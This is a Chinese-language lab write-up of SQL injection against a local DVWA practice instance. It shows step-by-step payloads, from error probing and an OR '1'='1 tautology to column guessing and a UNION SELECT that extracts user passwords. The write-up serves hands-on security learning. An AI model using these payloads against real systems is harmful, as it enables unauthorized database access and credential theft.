# SQL Injection

可以發現 URL query string 有可以下手的地方

```bash
http://dvwa.localtest:8086/vulnerabilities/sqli/?id=1&Submit=Submit#
```

### 測試及觀察錯誤訊息

id 第一個數字後面不管接什麼都可以 pass，可能代表 SQL 已經被結尾?

```bash
1zxw1--;
```

```bash
http://dvwa.localtest:8086/vulnerabilities/sqli/?id=1zxw1--;&Submit=Submit#
```

試著送出會讓它噴 error 的內容
從這邊可以觀察出 SQL 會自動幫我們補上哪些 single quote，為了更方便觀察，使用其他符號看看
```bash
http://dvwa.localtest:8086/vulnerabilities/sqli/?id=%271%27&Submit=Submit#
```
---

送出 `@` 方便觀察字串的位置
```bash
http://dvwa.localtest:8086/vulnerabilities/sqli/?id=%271@&Submit=Submit#
```

```bash
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1@'' at line 1
```

---

我們可以在 '1@' 後面的位置繼續補上 OR ‘1’=’1，讓它行成 ‘1’ = ‘1’

```bash
3' OR '1'='1
```

```bash
http://dvwa.localtest:8086/vulnerabilities/sqli/?id=3%27%20OR%20%271%27=%271&Submit=Submit#
```
意味著 SQL 會在前後補上 single quote，因此在第一個 id 後面補上 `'` ，這樣就可以接著第二組的 OR，第2組的條件結尾故意不加上 `'` ，這樣就形成合法的 query 了

```bash
2' OR 1='1 union select * from users;
```

## 取得密碼

### 測試 column names

可以從回傳的狀態和訊息來判斷自己的猜測是否正確

```bash
2' OR user_id='1
```

```bash
# X
1' AND sur_name='admin 
```

```bash
# first_name column ok
1' AND first_name='admin 
```

```bash
# last_name column ok
1' AND last_name='admin
```

```bash
# password column ok
1' AND password<>'0
```
---

### 測試 table name

```bash
2' UNION SELECT user_id,user_id FROM user WHERE user_id='1
```

```bash
Table 'dvwa.user' doesn't exist
```

---

## Done

取得密碼欄位的內容

```bash
1' UNION SELECT first_name,password FROM users WHERE user_id<>'0
```

```bash
1' UNION SELECT first_name,password FROM users WHERE user_id <>'
```

## 心得

隨然 wiki 上有標準答案，盡量試著從黑箱角度去推斷原本的 SQL 可能是怎樣寫的，強化理解
